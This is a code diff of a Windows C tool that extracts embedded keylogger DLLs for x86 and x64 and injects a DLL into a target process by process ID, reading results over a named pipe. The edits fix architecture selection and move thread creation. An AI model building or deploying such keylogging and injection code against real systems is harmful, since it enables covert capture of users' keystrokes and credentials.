@@ -101,9 +101,9 @@ BOOL ExtractEmbedded(void)
     if (!ExtractEmbeddedFile("createfile.x64.dll", binaryData, fileSize))
         areExtracted = FALSE;
 
-    binaryData = binary_bin_keylog_x64_dll_start;
-    fileSize = binary_bin_keylog_x64_dll_end - binary_bin_keylog_x64_dll_start;
-    if (!ExtractEmbeddedFile("keylog.x64.dll", binaryData, fileSize))
+    binaryData = binary_bin_keylog_x86_dll_start;
+    fileSize = binary_bin_keylog_x86_dll_end - binary_bin_keylog_x86_dll_start;
+    if (!ExtractEmbeddedFile("keylog.x86.dll", binaryData, fileSize))
         areExtracted = FALSE;
 
     binaryData = binary_bin_keylog_x64_dll_start;
@@ -142,9 +142,9 @@ BOOL ExtractEmbedded(void)
     if (!ExtractEmbeddedFile("keylog.x64.dll", binaryData, fileSize))
         areExtracted = FALSE;
 
-    binaryData = _binary_bin_keylog_x64_dll_start;
-    fileSize = _binary_bin_keylog_x64_dll_end - _binary_bin_keylog_x64_dll_start;
-    if (!ExtractEmbeddedFile("keylog.x64.dll", binaryData, fileSize))
+    binaryData = _binary_bin_keylog_x86_dll_start;
+    fileSize = _binary_bin_keylog_x86_dll_end - _binary_bin_keylog_x86_dll_start;
+    if (!ExtractEmbeddedFile("keylog.x86.dll", binaryData, fileSize))
         areExtracted = FALSE;
 #endif
     return areExtracted;
@@ -580,6 +580,8 @@ BOOL CommandExtract()
 BOOL CommandInject(WCHAR* process, WCHAR* dllPath)
 {
     DWORD pid = _wtoi(process);
+    // Create thread to continuously read from the named pipe
+    CreateThread(NULL, 0, ThreadNamedPipe, NULL, 0, 0);
     if(pid != 0)
     {        
         CreateThread(NULL, 0, ThreadNamedPipe, NULL, 0, 0);
@@ -603,8 +605,7 @@ BOOL CommandInject(WCHAR* process, WCHAR* dllPath)
         free(processIds);
         return FALSE;
     }
-    // Create thread to continuously read from the named pipe
-    CreateThread(NULL, 0, ThreadNamedPipe, NULL, 0, 0);
+
     for (DWORD i = 0; i < count; i++)
     {
         // Create thread to continuously read from the named pipe
